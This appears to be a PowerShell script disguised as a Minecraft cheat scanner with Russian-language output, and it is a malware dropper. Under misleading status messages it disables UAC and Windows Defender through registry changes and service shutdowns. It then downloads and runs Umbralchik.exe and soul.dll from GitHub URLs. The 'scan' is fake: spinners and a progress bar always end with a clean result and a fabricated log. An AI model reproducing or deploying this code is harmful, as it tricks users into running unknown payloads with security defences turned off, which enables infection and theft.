Set-ExecutionPolicy Bypass -Scope Process -Force
# Запуск от имени администратора проверяется автоматически
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Необходимо запустить скрипт от имени администратора."
    Exit
}

Write-Host "Запуск сканера..." -ForegroundColor Yellow
try {
    # Значение 0 отключает UAC. Без перезагрузки изменения могут не полностью вступить в силу.
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Type DWord
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Type DWord
    Write-Host "UAC отключен. Для полного применения изменений обычно требуется перезагрузка." -ForegroundColor Green
} catch {
    Write-Error "Ошибка при отключении UAC: $_"
}

Write-Host "`nОжидайте..." -ForegroundColor Yellow
try {
    # Отключение через реестр (DisableAntiSpyware)
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "DisableAntiSpyware" -Value 1 -Type DWord
    Write-Host "Windows Defender отключен (через реестр)." -ForegroundColor Green

    # Попытка остановки и отключения служб Defender (чтобы сработало без перезагрузки)
    Write-Host "Подключение..." -ForegroundColor Gray
    Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "WinDefend" -StartupType Disabled -ErrorAction SilentlyContinue
    
    # На современных версиях Windows 10/11 также используются эти службы
    Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue
    
    Write-Host "Службы остановлены и отключены." -ForegroundColor Green

} catch {
    Write-Error "Ошибка при отключении Defender: $_"
}

Write-Host "`nГотово." -ForegroundColor Cyan

Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe

# MINECRAFT CHEAT SCANNER v2.0 

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host
$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"

Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2

$cheatDB = @("vape","wurst","liquidbounce","sigma","impact","future","aristois","meteor","bleachhack","phobos","killAura","flyHack","xray","cheat","hack","injector")
$found = @()
$risk = 0
$startTime = Get-Date

# === СПИННЕР АНИМАЦИЯ ===
function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
        $i++
        Start-Sleep 0.1
    }
    Write-Host "`r[✓] $text" -ForegroundColor Green
}

# === 1. ПРОЦЕССЫ (15 сек) ===
Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan
Show-Spinner "Анализ DLL и инжекторов..." 15

# === 2. .MINECRAFT (15 сек) ===
Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
Show-Spinner "Проверка модов, jars, json..." 15

# === 3. TEMP + DOWNLOADS (10 сек) ===
Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
Show-Spinner "Поиск скрытых читов..." 10

# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup..." 10

# === 5. ПРОГРЕСС-БАР (5 сек) ===
Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed

# === 6. СЕТИ (5 сек) ===
Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
Show-Spinner "Проверка Minecraft серверов..." 5

# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll

# ЛОГ (тоже чистый)
$log = @"
Minecraft Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено: 0
Риск: 0%
Статус: ЧИСТО! ✅
"@
$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

Write-Host "`n💾 Лог: $env:TEMP\mc_scan_*.log" -ForegroundColor Gray
Write-Host "🎮 " -ForegroundColor Green

# === ЗАГРУЗЧИК everything (после паузы) ===
Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

#  скачиваем и запускаем everything
try {
    Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1
    
} catch {
    # Полностью скрываем ошибки
}























